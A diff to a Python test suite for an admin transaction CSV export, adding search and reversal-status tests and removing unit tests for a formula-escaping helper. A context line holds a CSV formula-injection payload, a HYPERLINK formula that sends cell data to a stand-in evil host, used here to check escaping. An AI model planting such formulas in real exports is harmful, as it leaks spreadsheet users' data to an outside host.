@@ -1139,6 +1139,29 @@ class TransactionAdminExportViewTests(APITestMixin):
 
         assert [row['Course Title'] for row in rows] == [self.content_title]
 
+    def test_search_matches_learner_email_as_well_as_course_title(self):
+        """``search_fields`` covers lms_user_email too, not just content_title."""
+        self._create_spend(content_title='Unrelated course', lms_user_email='findme@example.com')
+        self.set_up_admin()
+
+        _, rows = self._export(search='findme@example.com')
+
+        assert [row['Learner Email'] for row in rows] == ['findme@example.com']
+
+    def test_non_committed_reversal_is_not_reported_as_refunded(self):
+        """Only a *committed* reversal means the spend was refunded; a pending one leaves it as spend."""
+        spend = self._create_spend(content_title='Pending reversal course')
+        ReversalFactory(
+            transaction=spend,
+            quantity=-spend.quantity,
+            state=TransactionStateChoices.PENDING,
+        )
+        self.set_up_admin()
+
+        _, rows = self._export(search='Pending reversal course')
+
+        assert [row['Status'] for row in rows] == ['Committed']
+
     @ddt.data(
         {'start_date': 'not-a-date'},
         {'end_date': '2024-02-30'},
@@ -1184,22 +1207,6 @@ class TransactionAdminExportViewTests(APITestMixin):
         assert rows[0]['Course Title'] == '\'=HYPERLINK("https://evil.example.com?"&A1,"Click")'
         assert rows[0]['Learner Email'] == "'-2+3@example.com"
         assert rows[0]['Course Key'] == "'@SUM(A1:A2)"
-
-    @ddt.data(
-        ('=1+1', "'=1+1"),
-        ('+1', "'+1"),
-        ('-1', "'-1"),
-        ('@A1', "'@A1"),
-        ('\tx', "'\tx"),
-        ('\rx', "'\rx"),
-        ('safe=text', 'safe=text'),
-        ('', ''),
-        (None, None),
-        (42, 42),
-    )
-    @ddt.unpack
-    def test_escape_formula(self, value, expected):
-        assert escape_formula(value) == expected
 
     def test_seats_ledger_amounts_are_not_converted_from_cents(self):
         seats_subsidy = SubsidyFactory(
